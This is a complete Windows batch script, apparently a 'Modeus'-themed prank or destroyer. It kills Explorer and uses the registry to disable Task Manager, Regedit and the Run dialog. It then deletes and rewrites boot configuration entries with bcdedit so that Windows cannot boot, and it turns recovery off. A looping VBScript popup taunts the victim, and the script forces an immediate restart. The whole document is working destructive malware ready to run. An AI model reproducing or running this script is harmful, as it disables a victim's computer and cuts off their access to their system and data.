@echo off
:: Kill Explorer
taskkill /f /im explorer.exe

:: Disable Task Manager, Regedit, and Run Dialog by modifying the registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f

:: Corrupt BCD using bcdedit (make Windows unbootable and trigger network boot)
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No
bcdedit /deletevalue {default} osdevice
bcdedit /deletevalue {default} device
bcdedit /set {default} path \windows\system32\winload.exe
bcdedit /set {default} osdevice boot
bcdedit /set {default} device boot

:: Create VBScript file to show Modeus-style error message and persist
echo Set WshShell = CreateObject("WScript.Shell") > %temp%\error.vbs
echo Do >> %temp%\error.vbs
echo WshShell.Popup "Hehehe... Look at you, thinking you could just use your PC without consequences. You really thought you had control, didn''t you? Foolish... You''re trapped now, and there''s no escape. You''ve angered me, and now it''s time for your punishment. Windows? Ha! Your system is a fragile thing, so easy to break. It was doomed from the start, just like you. I warned you, but you didn''t listen. Every click, every action... You sealed your fate. You think you''re the one in charge, but no, I am. You can''t run away from me, you can''t fix this. Your computer is now mine, and it''s too late for you to change anything. The BCD is gone, your boot configuration is gone... and you? You''re stuck. So go ahead, try to reboot... but you won''t get anywhere. Your system is DONE. It''s too late to save yourself. Welcome to my domain.", 0, "Error", 48 >> %temp%\error.vbs
echo Loop >> %temp%\error.vbs

:: Run the VBScript to show the error message and persist
cscript //nologo %temp%\error.vbs

:: Force shutdown or restart immediately
shutdown /r /f /t 0
